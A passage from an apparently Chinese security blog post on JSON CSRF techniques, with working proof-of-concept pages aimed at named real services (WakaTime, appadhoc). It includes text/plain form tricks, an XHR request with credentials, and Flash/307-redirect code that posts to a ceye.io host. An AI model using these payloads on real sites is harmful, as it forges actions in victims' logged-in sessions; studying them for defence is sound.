+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$( document ).ready(function() &#123;</span><br><span class="line">    $(&quot;#z&quot;).attr(&quot;name&quot;,&apos;&#123;&quot;entity&quot;:&quot;https://zzz.com&quot;,&quot;type&quot;:&quot;domain&quot;,&quot;time&quot;:&quot;&apos;+($.now()/1000)+&apos;&quot;,&quot;project&quot;:&quot;&lt;&lt;LAST_PROJECT&gt;&gt;&quot;,&quot;is_debugging&quot;:false,&quot;plugin&quot;:&quot;chrome-wakatime/1.0.2&quot;,&quot;fakeparam&quot;:&quot;&apos;);</span><br><span class="line">    $(&quot;#f&quot;).submit();</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form id=&quot;f&quot; ENCTYPE=&quot;text/plain&quot; action=&quot;https://api.wakatime.com/api/v1/users/current/heartbeats&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input id=&quot;z&quot; type=&quot;hidden&quot; name=&apos;test&apos; value=&apos;test&quot;&#125;&apos;&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>给value赋予一个值，构造正常的json数据包<br>形式一：用单引号构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;</span><br><span class="line">      &lt;input name=&apos;&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://blog.csdn.net/&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;,&quot;test&quot;:&quot;&apos; value=&apos;test&quot;&#125;&apos; type=&apos;hidden&apos;&gt; </span><br><span class="line">      &lt;input type=submit&gt; </span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请求数据：</span><br><span class="line">POST /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 124</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;,&quot;test&quot;:&quot;=test&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>返回200</p>
+<h4 id="服务器查找json格式的数据并验证Content-type，即application-json"><a href="#服务器查找json格式的数据并验证Content-type，即application-json" class="headerlink" title="服务器查找json格式的数据并验证Content-type，即application/json"></a>服务器查找json格式的数据并验证Content-type，即application/json</h4><p>但在校验Content-type的情况下，这个时候上述方法就行不不通了。这个时候可以用ajax来自定义数据头，XHRHTTPREQUEST修改Content-Type,改成application/json<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function submitRequest()</span><br><span class="line">      &#123;</span><br><span class="line">        var xhr = new XMLHttpRequest();</span><br><span class="line">        xhr.open(&quot;POST&quot;, &quot;http://www.xxx.com/webnet/edit&quot;, true);</span><br><span class="line">        xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;);</span><br><span class="line">        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;);</span><br><span class="line">        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;);</span><br><span class="line">        xhr.withCredentials = true;</span><br><span class="line">        xhr.send(JSON.stringify(&#123;&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;#&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是这个有个缺陷，使用xmlhttprequest的时候，会先发一个OPTIONS请求预检(非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求,即浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错)，在使用XHR的时候空域状态下会有跨域限制。这里涉及到cors跨域限制的问题，详情可以看看<br>‘<a href="https://my.oschina.net/hccake/blog/886602&#39;" target="_blank" rel="noopener">https://my.oschina.net/hccake/blog/886602&#39;</a></p>
+<p>预检请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: content-type</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p>
+<p>其中如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。<br>报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &apos;https://experiment.appadhoc.com/get_flags_async&apos; from origin &apos;null&apos; has been blocked by CORS policy: Response to preflight request doesn&apos;t pass access control check: The value of the &apos;Access-Control-Allow-Origin&apos; header in the response must not be the wildcard &apos;*&apos; when the request&apos;s credentials mode is &apos;include&apos;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</span><br></pre></td></tr></table></figure></p>
+<p>服务器设置允许任意域名跨域请求与可携带cookie进行了冲突，这个问题是后端配置的问题<br>（axios默认是发送请求的时候不会带上cookie的，需要通过设置withCredentials: true来解决。 这个时候需要注意需要后端配合设置实际的origin，不能为* ）</p>
+<p>遇到cors跨域请求不通过的时候flash　+ 307 跳转就可以派上用场了。</p>
+<h5 id="flash-307-即SWF-JSON-CSRF-待补充"><a href="#flash-307-即SWF-JSON-CSRF-待补充" class="headerlink" title="flash + 307 即SWF_JSON_CSRF-待补充"></a>flash + 307 即SWF_JSON_CSRF-待补充</h5><p>参考 <a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a> </p>
+<ul>
+<li><p>as编辑swf文件<br>编辑修改swf文件这里我用的是ffdec<br>构造payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">   import flash.display.Sprite;</span><br><span class="line">   import flash.net.URLLoader;</span><br><span class="line">   import flash.net.URLRequest;</span><br><span class="line">   import flash.net.URLRequestHeader;</span><br><span class="line">   import flash.net.URLRequestMethod;</span><br><span class="line">   </span><br><span class="line">   public class re extends Sprite</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">      public function re()</span><br><span class="line">      &#123;</span><br><span class="line">         var member1:Object = null;</span><br><span class="line">         var myJson:String = null;</span><br><span class="line">         Wonderfl.capture(stage);</span><br><span class="line">         super();</span><br><span class="line">         Wonderfl.capture(stage);</span><br><span class="line">         member1 = new Object();</span><br><span class="line">         member1 = &#123;</span><br><span class="line">            &quot;name&quot;:&quot;attacker&quot;,</span><br><span class="line">            &quot;email&quot;:&quot;attacker@gmail.com&quot;</span><br><span class="line">         &#125;;</span><br><span class="line">         var myData:Object = member1;</span><br><span class="line">         myJson = JSON.stringify(myData);</span><br><span class="line">         myJson = JSON.stringify(myData);</span><br><span class="line">         var url:String = &quot;http://xxxxx.ceye.io&quot;;</span><br><span class="line">         var request:URLRequest = new URLRequest(url);</span><br><span class="line">         request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">         request.data = myJson;</span><br><span class="line">         request.method = URLRequestMethod.POST;</span><br><span class="line">         var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">         try</span><br><span class="line">         &#123;</span><br><span class="line">            urlLoader.load(request);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line">         catch(e:Error)</span><br><span class="line">         &#123;</span><br><span class="line">            trace(e);</span><br><span class="line">            return;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>php307 跳转</p>
+</li>
+</ul>
+<p>由于307跳转会带上原有的数据格式和类型，所以使用307跳转</p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// redirect automatically</span><br><span class="line"></span><br><span class="line">header(&quot;Location: https://xx.xxx.xx/xx&quot;, true, 307);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html</span><br><span class="line">https://my.oschina.net/hccake/blog/886602</span><br><span class="line">https://www.freebuf.com/articles/web/164234.html</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/7930126.html</span><br><span class="line">http://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/</span><br><span class="line">https://github.com/sp1d3r/swf_json_csrf</span><br><span class="line">https://github.com/bottlepy/bottle/issues/616</span><br><span class="line">https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html</span><br><span class="line">https://www.csdn.net/article/2015-07-14/2825207</span><br><span class="line">https://book.2cto.com/201310/34316.html</span><br><span class="line">http://blog.knownsec.com/2014/06/flashupload_csrf_attacking/</span><br><span class="line">http://cm2.pw/</span><br></pre></td></tr></table></figure>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="CORS与JSONP的区别-待补充"><a href="#CORS与JSONP的区别-待补充" class="headerlink" title="CORS与JSONP的区别-待补充"></a>CORS与JSONP的区别-待补充</h2><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/21/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/25/mactest-md/" rel="prev" title="mactest.md">
+                mactest.md <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">blackj liuyun</p>
+              <p class="site-description motion-element" itemprop="description">纯净水@流云-自留地</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#json与jsonp的学习与分析"><span class="nav-number">1.</span> <span class="nav-text">json与jsonp的学习与分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#json和jsonp的区别"><span class="nav-number">1.1.</span> <span class="nav-text">json和jsonp的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jsonp-简介"><span class="nav-number">1.2.</span> <span class="nav-text">jsonp 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jsonp-风险"><span class="nav-number">1.3.</span> <span class="nav-text">jsonp 风险</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jsonp劫持"><span class="nav-number">1.3.1.</span> <span class="nav-text">jsonp劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用条件"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用方式"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防范措施"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">防范措施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callback可自定义导致的安全问题-典型案例"><span class="nav-number">1.3.2.</span> <span class="nav-text">callback可自定义导致的安全问题 典型案例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Content-Type与XSS漏洞"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">Content-Type与XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用条件-1"><span class="nav-number">1.3.2.1.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用方式-1"><span class="nav-number">1.3.2.1.2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#防范"><span class="nav-number">1.3.2.1.3.</span> <span class="nav-text">防范</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MHTML与JSONP"><span class="nav-number">1.3.3.</span> <span class="nav-text">MHTML与JSONP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FLASH与JSONP"><span class="nav-number">1.3.4.</span> <span class="nav-text">FLASH与JSONP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FLASH的调用及域"><span class="nav-number">1.3.4.0.1.</span> <span class="nav-text">FLASH的调用及域</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用思路"><span class="nav-number">1.3.4.0.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用验证"><span class="nav-number">1.3.4.0.3.</span> <span class="nav-text">利用验证</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#利用环境"><span class="nav-number">1.3.4.0.3.1.</span> <span class="nav-text">利用环境</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用JSONP进行水坑攻击"><span class="nav-number">1.3.5.</span> <span class="nav-text">利用JSONP进行水坑攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSON风险"><span class="nav-number">1.4.</span> <span class="nav-text">JSON风险</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JSON格式的CSRF"><span class="nav-number">1.4.1.</span> <span class="nav-text">JSON格式的CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器查找json格式的数据但不验证Content-type"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">服务器查找json格式的数据但不验证Content-type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器查找json格式的数据并验证Content-type，即application-json"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">服务器查找json格式的数据并验证Content-type，即application/json</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#flash-307-即SWF-JSON-CSRF-待补充"><span class="nav-number">1.4.1.2.1.</span> <span class="nav-text">flash + 307 即SWF_JSON_CSRF-待补充</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充"><span class="nav-number">3.</span> <span class="nav-text">补充</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CORS与JSONP的区别-待补充"><span class="nav-number">3.1.</span> <span class="nav-text">CORS与JSONP的区别-待补充</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">blackj liuyun</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">20.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
